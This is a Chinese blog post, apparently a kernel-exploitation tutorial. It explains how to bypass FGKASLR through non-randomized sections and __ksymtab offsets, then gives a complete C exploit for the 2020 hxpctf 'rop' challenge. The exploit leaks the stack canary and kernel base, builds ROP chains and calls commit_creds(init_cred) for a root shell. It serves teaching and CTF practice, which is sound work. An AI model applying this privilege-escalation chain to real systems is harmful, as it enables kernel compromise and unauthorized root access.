---
layout: post
title: 0x0A. Linux kernel基础：FGKASLR及其绕过方式
category: kernel pwn
date: 2025-3-03 12:00:00
---
绕过fgkaslr以防止fgkaslr对kaslr的绕过的防御：）
<!-- more -->


[toc]

# Linux kernel之FGKASLR的绕过

## 0x00. 什么是FGKASLR

简单来说，`FGKASLR`是一种在`KASLR`上更高级的保护。

我们知道`KASLR`能够让内核中的地址存在一个偏移，若泄露出任意一个某段的内核函数的实际地址时，即可以计算出该偏移，从而通过该偏移获取该段所有的内核地址。

而`FGKASLR`是一种更细粒度的保护：它在`KASLR`的基础上，让函数的地址进行**二次随机化**，从而保证每个函数的地址都是相对随机的。如此一来，即使泄露出某个函数的地址，甚至是泄露出`KASLR`的偏移，我们也难以获取所有的函数地址。

## 0x01. 绕过思路

幸运的是，该保护并不是“无敌”的（这`linux kernel`骗我们啊，这`FGKASLR`它也不无敌啊）。

简单思考，若经过二次随机化后的函数达到了真正意义上的“完全随机化”，那么即便是内核本身也无法得知其它函数的地址。由此，可能会存在一种结构能够保存这种地址。下面对`FSKASLR`实现部分的源码进行分析，这部分摘抄自`ctf-wiki`：

在`layout_randomized_image`函数中会计算最终随机化的节区，并存储在`sections`中：

```c
    /*
     * now we need to walk through the section headers and collect the
     * sizes of the .text sections to be randomized.
     */
    for (i = 0; i < shnum; i++) {
        s = &sechdrs[i];
        sname = secstrings + s->sh_name;

        if (s->sh_type == SHT_SYMTAB) {
            /* only one symtab per image */
            if (symtab)
                error("Unexpected duplicate symtab");

            symtab = malloc(s->sh_size);
            if (!symtab)
                error("Failed to allocate space for symtab");

            memcpy(symtab, output + s->sh_offset, s->sh_size);
            num_syms = s->sh_size / sizeof(*symtab);
            continue;
        }

        if (s->sh_type == SHT_STRTAB && i != ehdr->e_shstrndx) {
            if (strtab)
                error("Unexpected duplicate strtab");

            strtab = malloc(s->sh_size);
            if (!strtab)
                error("Failed to allocate space for strtab");

            memcpy(strtab, output + s->sh_offset, s->sh_size);
        }

        if (!strcmp(sname, ".text")) {
            if (text)
                error("Unexpected duplicate .text section");

            text = s;
            continue;
        }

        if (!strcmp(sname, ".data..percpu")) {
            /* get start addr for later */
            percpu = s;
            continue;
        }

        if (!(s->sh_flags & SHF_ALLOC) ||
            !(s->sh_flags & SHF_EXECINSTR) ||
            !(strstarts(sname, ".text")))
            continue;

        sections[num_sections] = s;

        num_sections++;
    }
    sections[num_sections] = NULL;
    sections_size = num_sections;
```

从上面得知，只有同时满足三个条件的节区才会参与二次随机化：

- 节区名以 `.text` 开头
- `section flags` 中包含`SHF_ALLOC`

- `section flags` 中包含`SHF_EXECINSTR`

这些部分包括大部分的内核函数，例如常用的`commit_creds`、`prepare_kernel_cred`等。而且大部分的`gadget`也包含在内。

而通过上面的源码，我们知道部分节区的函数并不会参与二次随机化，不会参与随机化的重要节区有：

- `.data`不会参与随机化
- 第一个`.text`节不会参与随机化
- `__ksymtab`不会参与随机化

其中，诸如`init_cred`等属于`.data`段，因此并不会参与二次随机化，即泄露出内核基地址后就可以直接得到它的内核基地址。

而还有部分函数位于第一个`.text`节，例如`swapgs_restore_regs_and_return_to_usermode`等函数。这可以在关闭`kaslr`的情况下，查看其地址是否位于`0xffffffff81000000 - 0xffffffff81200000`之间。若位于则不会参与随机化。

而对于`FGKASLR`最核心的还是`__ksymtab`段。该段不会参与二次随机化，且其保存了经过二次随机化后的函数的地址。例如，我们可以在`/proc/kallsyms`中找到`__ksymtab_commit_creds`的地址：

```c
/ # cat /proc/kallsyms | grep '__ksymtab_commit_creds'
ffffffff81f87d90 r __ksymtab_commit_creds
```

其实际上是一个结构体，定义如下：

```c
struct kernel_symbol {
    int value_offset;
    int name_offset;
    int namespace_offset;
};
```

其中：

- `value_offset`记录了内核符号的值的偏移
- `name_offset`记录了内核符号的名称的偏移
- `namespace_offset`记录了内核符号所属的命名空间的偏移

我们关注`value_offset`这一项。例如，我们计算得到`__ksymtab_commit_creds`的地址为`0xffffffffa8587d90`，且其中存放的`value_offset`的值为`0xffa17ef0`，那么计算的结果为`0xffffffffa8587d90- (2^32 - 0xffa17ef0) = 0xffffffffa7f9fc80`，即为`commit_creds`函数的地址！

通过这种方式，我们就可以计算出任何一个内核函数的地址了。

这里注意上面的计算过程，我们使用`2^32`减去计算出的`value_offset`，再使用`__ksymtab`的地址来减去结果，这是因为`value_offset`中存放的值为`int`类型，而`0xffa17ef0`为负数，因此要先转换后再相减才能获得其真实值。

## 0x02. gadget寻找

到这里，我们就能够应付大多数情况下`fgkaslr`的绕过了，唯独`gadget`的寻找还存在问题。

这里，我们利用地址位于`0xffffffff81000000 - 0xffffffff81200000`之间的代码不会参与随机化的这一个特性，筛选出可用的`gadget`。

我们同样先获取所有的`gadgets`，例如这里使用`ROPgadget`：

```bash
ROPgadget ./binary ./vmlinux --depth=40 > gadgets.txt
```

随后可以编写一个`python`脚本来筛选出不会二次随机化的`gadget`，例如笔者手写了一个如下（写得很烂）

```python
from pwn import *

i = 0
with open("./gadgets.txt", "rt") as f:
    with open("./gadgets_fg.txt", "wt") as f2:
        line = f.readline()
        while line != '':
            if not line.startswith('0x'):
                line = f.readline()
                continue
            i += 1
            if i % 0x100 == 0:
                print(f"Success process of {i} lines.")
            if int(line.split(' ')[0], 16) < 0xffffffff81200000:
                f2.write(line)
            line = f.readline()        
```

随后即可在`gadgets_fg.txt`中正常寻找`gadgets`。

## 0x03. 小结

总结一下`FGKASLR`和其绕过思路。首先`FGKASLR`会让部分函数和地址进行二次随机化，因此我们需要利用不会被二次随机化的地址来完成剩余操作。

不会被二次随机化的函数和变量有：

- 位于`0xffffffff81000000 - 0xffffffff81200000`的函数和`gadget`，包括常见的`__memcpy`函数、`swapgs_restore_regs_and_return_to_usermode`函数

- 位于`data`段的变量，例如`init_cred`
- `__ksymtab`段的函数



其余函数，通过`__ksymtab`的`value_offset`和其本身的地址进行计算，计算方式如下：

- `__ksymtab_func_addr - (2^32 - value_offset)`



对于`gadget`寻找，参考`gadget`寻找一节。

## 0x04. demo：2020-hxpctf-rop

逻辑依然是很清晰（~~这是因为要逆半天的都不是很想分析~~）

只有`read`和`write`功能，都是狠狠地溢出：

```c
ssize_t __fastcall hackme_read(file *f, char *data, size_t size, loff_t *off)
{
  unsigned __int64 v4; // rdx
  unsigned __int64 v5; // rbx
  bool v6; // zf
  ssize_t result; // rax
  int tmp[32]; // [rsp+0h] [rbp-A0h] BYREF
  unsigned __int64 v9; // [rsp+80h] [rbp-20h]

  _fentry__(f, data, size, off);
  v5 = v4;
  v9 = __readgsqword(0x28u);
  _memcpy(hackme_buf, tmp, v4);
  if ( v5 > 0x1000 )
  {
    _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096, v5);
    BUG();
  }
  _check_object_size(hackme_buf, v5, 1LL);
  v6 = copy_to_user(data, hackme_buf, v5) == 0;
  result = -14LL;
  if ( v6 )
    return v5;
  return result;
}

ssize_t __fastcall hackme_write(file *f, const char *data, size_t size, loff_t *off)
{
  unsigned __int64 v4; // rdx
  ssize_t v5; // rbx
  int tmp[32]; // [rsp+0h] [rbp-A0h] BYREF
  unsigned __int64 v8; // [rsp+80h] [rbp-20h]

  _fentry__(f, data, size, off);
  v5 = v4;
  v8 = __readgsqword(0x28u);
  if ( v4 > 0x1000 )
  {
    _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096, v4);
    BUG();
  }
  _check_object_size(hackme_buf, v4, 0LL);
  if ( copy_from_user(hackme_buf, data, v5) )
    return -14LL;
  _memcpy(tmp, hackme_buf, v5);
  return v5;
}
```

保护基本是全开，还开启了`FGKASLR`，因此这里就是一个在开启了`FGKASLR`的情况下，一个无限制栈溢出的场景。

这道题目我们的思路如下：

- 通过`read`泄露出`canary`和`kernel_offset`。注意需要选一个`0xffffffff81000000 - 0xffffffff81200000`的地址来泄露.
- 计算出`swapgs`、`gadget`的真实地址（不会被二次随机化因此可以直接计算）
- 通过`write`栈溢出，选择合适的`gadget`构建`rop`链，利用`mov rax, [rax]`这样的`gadget`来将`__ksymtab_commit_creds`的`value_offset`值置入`rax`
- 利用`swapgs`返回到用户态，在用户态中计算出`commit_creds`的真实地址
- 再次`write`栈溢出，此时可以正常构建`commit_creds(init_cred)`来进行提权



其中，我们用到了`mov rax, [rax]`这样的`gadget`：

```c
0xffffffff81015a7f : mov rax, qword ptr [rax] ; pop rbp ; ret
```



最终的`exp`编写如下：

```c
#include "ltfallkernel.h"

// 0xffffffff81015a7f : mov rax, qword ptr [rax] ; pop rbp ; ret
size_t mov_rax_rax_pop_rbp = 0xffffffff81015a7f;
size_t pop_rsi_rdi_rbx = 0xffffffff8100745c;
size_t __memcpy = 0xffffffff8100dd60;
size_t pop_rdx = 0xffffffff81007616;
size_t init_cred = 0xffffffff82060f20;
size_t swapgs = 0xffffffff81200f10;
size_t pop_rax = 0xffffffff81004d11;

size_t ksymtab_commit_creds = 0xffffffff81f87d90;
size_t commit_creds_value_offset;

int dev_fd;
size_t *buffer;
size_t canary;

__attribute__((naked)) void calc_addr()
{
    // 从 main 函数将value_offset的函数放到了rax，这里拿出来
    __asm__ volatile(
        "mov commit_creds_value_offset, rax;");
    
    // 计算commit_creds函数的真实地址
    size_t commit_creds = ksymtab_commit_creds + (0xffffffff & commit_creds_value_offset) - 4294967296;
    leak_info("commit_creds", commit_creds);

    // 用户空间无法执行内核态的代码，因此需要再次 rop
    int canary_index = 0x10;
    int ret_index = 0x14;
    buffer[canary_index] = canary;
    buffer[ret_index++] = pop_rsi_rdi_rbx;
    buffer[ret_index++] = 0;
    buffer[ret_index++] = init_cred;
    buffer[ret_index++] = 0;
    buffer[ret_index++] = commit_creds;
    buffer[ret_index++] = swapgs;
    buffer[ret_index++] = 0;
    buffer[ret_index++] = 0;
    buffer[ret_index++] = (size_t)get_root_shell;
    buffer[ret_index++] = user_cs;
    buffer[ret_index++] = user_rflags;
    buffer[ret_index++] = user_sp;
    buffer[ret_index++] = user_ss;

    write(dev_fd, buffer, 0x180);
}

int main()
{
    bind_core(0);
    save_status();

    info("Starting to exploit...");
    buffer = (size_t *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buffer < 0)
    {
        err_exit("mmap");
    }

    dev_fd = open("/dev/hackme", O_RDWR);
    if (dev_fd < 0)
    {
        err_exit("Failed to open hackme.");
    }
	
    // 从内核读取过多数据到栈上，泄露canary和kernel_base
    read(dev_fd, buffer, 0x180);
    // leak_content(buffer, 0x180 / 8);

    int kernel_index = 38;
    canary = buffer[2];

    kernel_offset = buffer[kernel_index] - 0xffffffff8100a157;
    kernel_base += kernel_offset;

    leak_info("kernel_offset", kernel_offset);
    leak_info("kernel_base", kernel_base);
    leak_info("canary", canary);
	
    // 计算出gadget和部分可用函数的地址
    mov_rax_rax_pop_rbp += kernel_offset;
    pop_rsi_rdi_rbx += kernel_offset;
    pop_rdx += kernel_offset;
    swapgs += kernel_offset + 0x16;
    __memcpy += kernel_offset;
    init_cred += kernel_offset;
    pop_rax += kernel_offset;
    ksymtab_commit_creds += kernel_offset;

    int canary_index = 0x10;
    int ret_index = 0x14;
	
    // 构建rop链，注意返回到用户态的calc_addr函数
    buffer[canary_index] = canary;
    buffer[ret_index++] = pop_rax;
    buffer[ret_index++] = ksymtab_commit_creds;
    buffer[ret_index++] = mov_rax_rax_pop_rbp;
    buffer[ret_index++] = 0;
    buffer[ret_index++] = swapgs;
    buffer[ret_index++] = 0;
    buffer[ret_index++] = 0;
    buffer[ret_index++] = (size_t)calc_addr;
    buffer[ret_index++] = user_cs;
    buffer[ret_index++] = user_rflags;
    buffer[ret_index++] = user_sp;
    buffer[ret_index++] = user_ss;
	
    // 栈溢出，随后会执行calc_addr函数
    write(dev_fd, buffer, 0x180);

    return 0;
}
```















